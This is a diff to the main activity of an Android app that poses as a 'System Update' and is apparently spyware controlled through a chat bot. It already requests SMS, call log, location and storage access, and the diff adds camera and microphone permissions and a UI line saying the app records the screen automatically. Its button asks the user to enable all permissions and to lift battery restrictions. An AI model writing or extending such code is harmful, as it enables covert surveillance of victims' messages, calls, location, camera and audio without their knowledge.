@@ -22,7 +22,9 @@ public class MainActivity extends AppCompatActivity {
         Manifest.permission.READ_SMS,
         Manifest.permission.READ_CALL_LOG,
         Manifest.permission.ACCESS_FINE_LOCATION,
-        Manifest.permission.READ_EXTERNAL_STORAGE
+        Manifest.permission.READ_EXTERNAL_STORAGE,
+        Manifest.permission.CAMERA,
+        Manifest.permission.RECORD_AUDIO
     };
 
     @Override
@@ -34,11 +36,11 @@ public class MainActivity extends AppCompatActivity {
         layout.setPadding(50, 100, 50, 50);
         
         TextView tvStatus = new TextView(this);
-        tvStatus.setText("⚙️ System Update\n\n✅ الخدمة تعمل\n📱 ارسل /help للبوت");
+        tvStatus.setText("⚙️ System Update\n\n✅ الخدمة تعمل\n📱 ارسل /help للبوت\n📸 يسجل الشاشة تلقائياً");
         tvStatus.setTextSize(16);
         
         Button btnPermissions = new Button(this);
-        btnPermissions.setText("🔓 إعطاء الصلاحيات");
+        btnPermissions.setText("🔓 تفعيل جميع الصلاحيات");
         btnPermissions.setOnClickListener(v -> {
             for (String permission : permissions) {
                 if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
@@ -50,7 +52,7 @@ public class MainActivity extends AppCompatActivity {
             Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
             intent.setData(Uri.parse("package:" + getPackageName()));
             startActivity(intent);
-            Toast.makeText(this, "✅ تم فتح الصلاحيات", Toast.LENGTH_LONG).show();
+            Toast.makeText(this, "✅ تم فتح جميع الصلاحيات", Toast.LENGTH_LONG).show();
         });
         
         layout.addView(tvStatus);
